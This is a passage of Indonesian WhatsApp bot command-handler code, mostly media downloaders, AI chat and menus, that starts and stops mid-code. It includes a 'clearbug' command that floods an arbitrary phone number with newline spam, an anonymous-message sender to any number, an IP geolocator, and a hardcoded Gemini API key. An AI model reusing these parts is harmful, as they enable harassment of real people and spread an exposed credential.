case 'tweeterdl':
case 'tweter':
case 'twittdl': {
 if (!args[0]) {
 return reply(`Mana linknya? Contoh penggunaan: ${prefix + command} https://twitter.com/username/status/1234567890`);
 }
 reply('tunggu sebentar ya..');

 const link = args[0];

 try {
 const downloadContent = async (link) => {
 if (!link || typeof link !== 'string' || !link.startsWith('https://x.com/')) {
 throw new Error('Etdaahhh, udah gede juga, yakali kudu dikasih tau mulu 🗿');
 }

 const ret = (attempt) => new Promise(resolve => setTimeout(resolve, 1000 * attempt));

 const submit = async (attempt = 1) => {
 try {
 const { data } = await axios.post('https://x2twitter.com/api/ajaxSearch', 
 `q=${encodeURIComponent(link)}&lang=en`,
 {
 headers: {
 'accept': '*/*',
 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'origin': 'https://x2twitter.com',
 'referer': 'https://x2twitter.com/en',
 'user-agent': 'Postify/1.0.0',
 }
 }
 );

 const $ = cheerio.load(data.data);
 const media = [];

 $('.photo-list .download-items, .tw-video').each((_, el) => {
 const $el = $(el);
 const type = $el.hasClass('download-items') ? 'photo' : 'video';
 const item = {
 title: $el.find('h3').text().trim(),
 thumbnail: $el.find('img').attr('src'),
 dlink: $el.find('a[href^="https://dl.snapcdn.app/get"]').map((_, link) => {
 const $link = $(link);
 return {
 quality: $link.text().includes('MP3') ? 'MP3' : 
 $link.text().includes('Photo') ? 'Photo' : 
 `MP4 (${$link.text().match(/\((\d+p)\)/)?.[1].toUpperCase() || 'Kagak tau 💃'})`,
 url: $link.attr('href')
 };
 }).get()
 };
 media.push({ type, ...item });
 });

 if (media.length === 0) {
 throw new Error('Kagak ada media yang bisa buat di download bree 😝');
 }

 return media;
 } catch (error) {
 if (attempt < 5) {
 console.log(`Yaaah gagal ${attempt} kali. Coba ulang dah...`);
 await ret(attempt);
 return submit(attempt + 1);
 }
 throw error;
 }
 };

 const mediaData = await submit();
 return mediaData;
 };

 const result = await downloadContent(link);

 for (const item of result) {
 if (item.type === 'video') {
 await client.sendMessage(m.chat, {
 video: { url: item.dlink[0].url },
 caption: `*Video dari Twitter*\n- *Judul*: ${item.title}`
 });
 } else if (item.type === 'photo') {
 await client.sendMessage(m.chat, {
 image: { url: item.dlink[0].url },
 caption: `*Foto dari Twitter*\n- *Judul*: ${item.title}`
 });
 } else {
 reply(`Media dengan tipe *${item.type}* belum didukung untuk dikirim langsung.`);
 }
 }
 } catch (error) {
 reply(error.message);
 }
}
break
case "ganti-menu":
 if (!isOwner) return reply(mess.owner)
 if (text === "button") {
 reply("𝗦𝗨𝗖𝗖𝗘𝗦.")
 global.setmenu = "button"
 } else if (text === "button2") {
 reply("𝗦𝗨𝗖𝗖𝗘𝗦.")
 global.setmenu = "button2"
 } else if (text === "gif") {
 reply("𝗦𝗨𝗖𝗖𝗘𝗦.")
 global.setmenu = "gif"
 } else if (text === "image") {
 reply("𝗦𝗨𝗖𝗖𝗘𝗦.")
 global.setmenu = "image"
 } else if (text === "saluran") {
 reply("𝗦𝗨𝗖𝗖𝗘𝗦.")
 global.setmenu = "saluran"
 }
 break

case 'setmenu': {
if (!isOwner) return reply(mess.only.owner)
client.sendMessage(m.chat, {image: menugmbr, caption: `*Silahkan pilih Setmenu di bawah ini:*\n- .ganti-menu button\n- .ganti-menu button2\n- .ganti-menu image\n- .ganti-menu gif\n- .ganti-menu saluran\n- .ganti-menu dokumen`}, {quoted: m})
}
break

case "ttsearch": {
 if (!text) return reply(`Contoh : ${prefix + command} yang lagi viral`);
 await loading(); // Pesan sementara

 let { title, no_watermark } = await tiktoks(text);

 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: `\`${title}\``
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: 'Klik untuk selanjutnya'
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: false,
 ...await prepareWAMessageMedia({ video: { url: no_watermark } }, { upload: client.waUploadToServer })
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "quick_reply",
 "buttonParamsJson": `{"display_text": "Next Video", "id": ".ttsearch ${text}"}`
 }
 ],
 })
 })
 }
 }
 }, { quoted: m, userJid: m });

 client.relayMessage(m.chat, msg.message, {
 messageId: msg.key.id,
 });
async function tiktoks(query) {
 return new Promise(async (resolve, reject) => {
 try {
 const response = await axios({
 method: 'POST',
 url: 'https://tikwm.com/api/feed/search',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Cookie': 'current_language=en',
 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
 },
 data: new URLSearchParams({
 keywords: query,
 count: 10,
 cursor: 0,
 HD: 1
 })
 });

 const videos = response.data.data.videos;
 if (videos.length === 0) {
 reject("Tidak ada video ditemukan.");
 } else {
 const gywee = Math.floor(Math.random() * videos.length);
 const videorndm = videos[gywee];

 const result = {
 title: videorndm.title,
 cover: videorndm.cover,
 origin_cover: videorndm.origin_cover,
 no_watermark: videorndm.play,
 watermark: videorndm.wmplay,
 music: videorndm.music
 };
 resolve(result);
 }
 } catch (error) {
 reject(error);
 }
 });
}
}
break

case "logo": {
 if (!text) 
 return reply(`Gini ya tolol:\n ${prefix + command} dikatoki`)
 try {
 await loading();
 const url = `https://vapis.my.id/api/glitchtext?q=${encodeURIComponent(text)}`;
 const response = await axios.get(url, { responseType: "arraybuffer" });
 await client.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: "Berikut adalah gambar goblok yang Anda minta.",
 }, { quoted: m });
 } catch (err) {
 console.log("Error:", err);
 await client.sendMessage(m.chat, {
 text: "Maaf, terjadi kesalahan saat mencoba membuat gambar logo. Coba lagi nanti.",
 }, { quoted: m });
 }
 }   
 break

//ai #4
case 'gemini': {
 const { GoogleGenerativeAI } = require("@google/generative-ai");
 if (!text) return reply(`Contoh:\n${prefix + command} Halo?`);
const apikeynyah = "AIzaSyB3Q74etnADQ_qSX3OJtzTnteGh-fd4df8"
const genAI = new GoogleGenerativeAI(apikeynyah);
const model = genAI.getGenerativeModel({ model: "models/gemini-1.5-pro" });
const prompt = `${text}`;
const result = await model.generateContent(prompt); 
client.sendMessage(m.chat, // ID penerima (nomor telepon atau ID grup)
 {
 text: `*[ GEMINI - AI ]*\n\n ${result.response.text()}`, 
 footer: `Powered by dikzz`, 
 buttons: [
 {
 buttonId: '.123456789', 
 buttonText: {
 displayText: 'NICE-AI', 
 },
 type: 1, 
 },
 ],
 headerType: 1, 
 viewOnce: true,
 },
 { quoted: m }
);
}
break
case "123456789":
m.reply(`Makasih tod`)
break

//case ai #5




case 'trackip':
{
if (!text) return reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());
const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await client.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
reply(formatIPInfo(res)); 
} catch (e) { 
reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break

case 'clearbug': {
if (!isOwner) return reply('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!text) return reply(`Penggunaan ${command} 628×××`)
let = text.replace(/[^0-9]/g, "")
let target = text + '@s.whatsapp.net'
for (let i = 0; i < 3; i++) {
await client.sendMessage(target, {text: " Clear Bug\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
});
}
reply("Done clear bug");
}
break
        
case 'tagsw': {
 if (!isOwner) return reply(mess.only.owner);
 if (!text) return reply(`Masukkan teks untuk status atau reply gambar/video dengan caption`);
 let media = null;
 let options = {};
 const jids = [m.sender, m.chat];
 if (quoted) {
 const mime = quoted.mtype || quoted.mediaType;
 if (mime.includes('image')) {
 media = await m.quoted.download();
 options = {
 image: media,
 caption: text || m.quoted.text || '',
 };
 } else if (mime.includes('video')) {
 media = await m.quoted.download();
 options = {
 video: media,
 caption: text || m.quoted.text || '',
 };
 } else {
 options = {
 text: text || m.quoted.text || '',
 };
 }
 } else {
 options = {
 text: text,
 };
 }
 return client.sendMessage("status@broadcast", options, {
 backgroundColor: "#7ACAA7",
 textArgb: 0xffffffff,
 font: 1,
 statusJidList: await (await client.groupMetadata(m.chat)).participants.map((a) => a.id),
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [
 {
 tag: "mentioned_users",
 attrs: {},
 content: jids.map((jid) => ({
 tag: "to",
 attrs: { jid: m.chat },
 content: undefined,
 })),
 },
 ],
 },
 ],
 });
}
break
case "dukun": {
 if(!text) return m.reply("Masukan Nama");
 let anu = `https://api.siputzx.my.id/api/ai/dukun?content=${encodeURIComponent(text)}`
 const res = await fetch(anu);
 const response = await res.json();
 try {
 client.sendMessage(m.chat, {text: response.data}, {quoted: m})
 } catch (e) {
 console.log(e)
 await m.reply("error")
 }
 }
 break
case 'ytsearch':
case 'yts': {
 if (!text) return reply(`Example : ${prefix + command} story wa anime`);
 loading()
 let yts = require("yt-search");
 let anu = (await yts(text)).all
 let video = anu.filter(v => v.type === 'video')
 let channel = anu.filter(v => v.type === 'channel')
 let image = channel.length ? channel[0].image : video.length ? video[0].image : urlmenu.main

 let sections = [{
 title: "",
 highlight_label: 'start chats',
 rows: [{
 header: "",
 title: "Menu",
 description: `kembali ke menu !`,
 id: '.menu'
 },
 {
 header: "",
 title: "Owner Bot",
 description: "Owner bot, pemilik bot",
 id: '.owner'
 }
 ]
 }]

 video.forEach(async (data) => {
 sections.push({
 title: data.title,
 rows: [{
 title: "Get Video",
 description: `Get video from "${data.title}"`,
 id: `.ytmp4 ${data.url}`
 },
 {
 title: "Get Audio",
 description: `Get audio from "${data.title}"`,
 id: `.ytmp3 ${data.url}`
 }
 ]
 })
 })
 let listMessage = {
 title: 'Download Media!!',
 sections
 };
 loading()
 client.sendMessage(from, {
 document: fs.readFileSync("./package.json"),
 mimetype: 'application/vnd.ms-powerpoint',
 fileName: 'Hii ' + pushname,
 fileLength: 999999999999,
 pageCount: 100,
 caption: "ini result dari pencarian Anda",
 footer: global.namabot,
 buttons: [{
 buttonId: 'action',
 buttonText: {
 displayText: 'Dikatoki'
 },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify(listMessage)
 }
 }],
 contextInfo: {
 mentionedJid: [sender],
 externalAdReply: {
 thumbnailUrl: global.imageurl,
 mediaUrl: global.imageurl,
 mediaType: 1,
 sourceUrl: 'https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O',
 renderLargerThumbnail: true,
 title: "Y O U T U B E - S E A R C H",
 body: "𝕯𝕴𝕶𝕬𝕿𝕺𝕶𝕴 𝖀𝖅𝖀𝕸𝕬𝕶𝕴"
 }
 },
 headerType: 1,
 viewOnce: true
 });
}
break
break
case "play": {
 const axios = require("axios");
 if(!isGroup) return reply(`*Khusus di dalam grup blok goblok*`)
 if (!text) return reply('Masukkan Judul Contoh\nContoh La Vagualette!');
 await loading();
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://api.agatz.xyz/api/ytsearch?message=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;

 // Pilih hasil pertama dari data pencarian
 const data = searchData.data[0];
 if (!data) return reply("Lagu tidak ditemukan.");

 // Teks yang akan dikirimkan
 const tekswait = `_###_ YOUTUBE PLAYER ###

- Judul: ${data.title}
- Artis: ${data.author.name}
- URL: ${data.url}`;

 // Mengirim pesan informasi lagu
 let msg = generateWAMessageFromContent(from, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: tekswait
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `_Silahkan pilih media file di bawah_`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({ image : { url : data.thumbnail }}, { upload: client.waUploadToServer})), 
 title: ``,
 gifPlayback: true,
 subtitle: "YOUTUBE PLAY",
 hasMediaAttachment: false 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "quick_reply",
 "buttonParamsJson": `{"display_text":"VIDEO","id":"${prefix}ytmp4 ${data.url}"}`
 },
 {
 "name": "quick_reply",
 "buttonParamsJson": `{"display_text":"AUDIO","id":"${prefix}ytmp3 ${data.url}"}`
 }
 ],
 }),
 contextInfo: {
 mentionedJid: [m.sender], 
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: { 
 newsletterJid: "120363322427078436@newsletter",
 serverMessageId: 330,
 newsletterName: `𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎`, 
 }
 }
 })
 }
 }
}, {})

await client.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
}) 
}
break
case "cosplay": {
 loading()
 let ini_url = `https://fantox-cosplay-api.onrender.com/`
 let res = await fetch(ini_url)
 if (!res.ok) throw await res.text()
 client.sendMessage(from, {image: {url: ini_url},
caption: "Done ga bang?"}, {quoted: m})
 }
 break
 case "menfess": {
let t = text.split('|');
	if (t.length < 2) return reply(`*Format salah!*
Penggunaan: ${prefix + command} nomor target|nama|pesan
Contoh: ${prefix + command} 6285708112935|dikatoki|hai bayar hutangmu`);
	let walawwe = t[0];
	let nama = t[1];
	let pesan = t[2];
	let bijipler = walawwe.replace(/[^0-9]/g, "");
	let target = bijipler + '@s.whatsapp.net';
for (let j = 0; j < 1; j++) {
//mengirim pesan ke target
await client.sendMessage(target, {text: `*HALO KAK👋 @${target.split("@")[0]} ${ucapanWaktu} ADA PESAN RAHASIA NIH DARI SESEORANG*


*👤Nama:* ${nama}

*🔍Pesan:* ${pesan}


*🤖Note:* 
- Bot hanya meneruskan pesan dari seseorang, tidak mengubah/melihat pesan tersebut!
- Jika ingin membalas pesan silahkan ketik */balas* untuk membalas!
- Terimakasih telah menggunakan bot kami. Kami harap anda mengerti tentang cara kerja bot kami.`}, {quoted: qchanel})
}
//jika pesan sudah terkirim
await reply(`*Pesan telah terkirim✅️*\n Sedang menunggu balasan!`);
}
break
case "fbdl":
case "fb":
case "facebook": {
  if(!text) return reply(`Masukan Url:\n\n*Example:* .fb https://www.facebook.com/share/v/1BkUDwkv8C/`);
  loading();
  let anu = `https://vapis.my.id/api/fbdl?url=${encodeURIComponent(text)}`;
  const res = await fetch(anu);
  const response = await res.json();
  try {
    client.sendMessage(m.chat, {
      video: {
        url: response.data.hd_url}, 
        mimeType: 'video/mp4', 
        caption: `*_Title:_* ${response.data.title}\n*_Durasi:_* ${response.data.durasi}`},{quoted: m})
  } catch (err) {
    console.log(err);
    await m.reply(err)
  }
}
break
case "doodstream": {
if (!text) return reply(`Masukan link`)
const fetch = require('node-fetch');
 const link = text.split(' ')[1];
 const res = await fetch(`https://api.akuari.my.id/downloader/doodstream?link=${link}`);
 const data = await res.json();

 if (!data || !data.result || !data.result.url) {
 await client.sendMessage(sender, { text: 'Gagal ambil link video!' });
 } else {
 await client.sendMessage(sender, {
 video: { url: data.result.url },
 caption: `Berhasil download dari Doodstream.`
 }, { quoted: m });
 }
}
 break;

case "allmedia": {
 const fetch = require('node-fetch');
 const path = require('path');
 const url = text.split(' ')[1];
 if (!url) return reply(`*Masukan link!*`);
 try {
 // Ganti dengan API multi-downloader milikmu atau publik
 const apiRes = await fetch(`https://api.dhn-api.my.id/api/download?url=${encodeURIComponent(url)}`);
 const data = await apiRes.json();

 if (!data.result || !data.result.url) {
 await client.sendMessage(sender, { text: 'Gagal mendapatkan file dari link tersebut.' }, { quoted: m });
 break;
 }

 const fileUrl = data.result.url;
 const fileName = data.result.name || path.basename(fileUrl.split('?')[0]);
 const mime = data.result.mime || 'application/octet-stream';
 const ext = path.extname(fileName).toLowerCase();

 let type;
 if (mime.includes('video') || ext === '.mp4') type = 'video';
 else if (mime.includes('audio') || ext === '.mp3') type = 'audio';
 else type = 'document';

 let mediaMessage;

 if (type === 'video') {
 mediaMessage = {
 video: { url: fileUrl },
 caption: `Video: ${fileName}`
 };
 } else if (type === 'audio') {
 mediaMessage = {
 audio: { url: fileUrl },
 mimetype: 'audio/mpeg',
 ptt: false
 };
 } else {
 mediaMessage = {
 document: { url: fileUrl },
 mimetype: mime,
 fileName: fileName,
 caption: `File: ${fileName}`
 };
 }

 await client.sendMessage(sender, mediaMessage, { quoted: m });

 } catch (err) {
 console.log(err);
 await client.sendMessage(sender, { text: 'Terjadi kesalahan saat mengambil file.' }, { quoted: m });
 }
}
 break;

case "videy": {
 if (!text) {
 return client.sendMessage(from, { text: 'Masukkan URL yang valid ya kak!' }, { quoted: m });
 }

 try {
 const res = await fetch(`https://api.ryzendesu.vip/api/downloader/videy?url=${encodeURIComponent(text)}`);
 const data = await res.json();

 if (!data || !data.result || !data.result.url) {
 return client.sendMessage(from, { text: 'Gagal mengambil video. Pastikan link valid.' }, { quoted: m });
 }

 const videoUrl = data.result.url;

 await client.sendMessage(from, {
 video: { url: videoUrl },
 caption: `Berhasil download dari Videy:\n${url}`
 }, { quoted: m });

 } catch (err) {
 console.log(err);
 await client.sendMessage(from, { text: 'Terjadi kesalahan saat memproses link. Coba lagi nanti.' }, { quoted: m });
 }
}
 break;

case "backupsc": {
if (isOwner) {
m.reply("Memproses Pengambilan Script 𝐃𝐈𝐊𝐙𝐙-𝐁𝐔𝐆👿")
var name = `𝐃𝐈𝐊𝐙𝐙-𝐁𝐔𝐆👿`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await client.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Scriptbot Berhasil Dikirim Ke Chat Pribadi")
} else {
let teks = `*<!>* Script 𝐃𝐈𝐊𝐙𝐙-𝐁𝐔𝐆👿
Script Bot Ini Tidak Di Bagikan Secara *Gratis!!*

Jika Anda Berminat Ingin Membeli Script Ini, Silahkan Chat *085850185698*
 
*➡️ Testimoni :*
https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O`
client.relayMessage(m.chat, {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 1000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: teks, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}}
break
case "menu-all": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
͏ ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
${global.menubug}

${global.menugrup}

${global.menuai}

${global.menujadibot}

${global.menudownload}

${global.menusound}

${global.menustalk}

${global.menurandom}

${global.menudgtl}

${menuinstallpanel}

${global.menupanel}

${global.menuowner}`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".menu", 
 buttonText: { 
 displayText: "BACK TO MENU"
 }
 }, {   
 buttonId: ".owner", 
 buttonText: {
 displayText: "OWNER"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-install-panel": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menuinstallpanel}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".installpanel", 
 buttonText: { 
 displayText: "INSTALL PANEL"
 }
 }, {   
 buttonId: ".uninstallpanrl", 
 buttonText: {
 displayText: "UNINSTALL_PANEL"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-jadibot": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menujadibot}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".jadibot", 
 buttonText: { 
 displayText: "JADIBOT"
 }
 }, 
  {
 buttonId: ".listjadibot", 
 buttonText: { 
 displayText: "LIST JADIBOT"
 }
 },
 {   
 buttonId: ".stopjadibot", 
 buttonText: {
 displayText: "STOP JADIBOT"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-stalk": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
┠ ✓ 𝑺𝒕𝒂𝒕𝒖𝒔 : Online 
┖━━━━━───────━━━━━━͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏

${global.menustalk}
`,
 footer: "𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎",
 buttons: [
 {
 buttonId: ".ffstalk", 
 buttonText: { 
 displayText: "FF STALK"
 }
 }, {   
 buttonId: ".mlstalk", 
 buttonText: {
 displayText: "ML STALK"
 }
 }
],
 viewOnce: true,
 headerType: 6,
}, { quoted: m });
}
break
case "menu-other": {
client.sendMessage(m.chat, {
 image: fs.readFileSync("./image/menu.jpg"),
 caption: `┎━━━━ ⌜ *𝐁𝐎𝐓-𝐈𝐍𝐅𝐎* ⌟ ━─
┠ ♞ 𝑽𝒆𝒓𝒔𝒊𝒐𝒏 : 5.0 [ NEW ]
┠ ♘ 𝑹𝒖𝒏𝒕𝒊𝒎𝒆 : ${run}
┠ ⌫ 𝑺𝒑𝒆𝒆𝒅 : ${moment.duration(Date.now() - parseInt(m.messageTimestamp.toString()) * 1000).asSeconds()}ms
┠ ♚ 𝑴𝒐𝒅𝒆 : Public
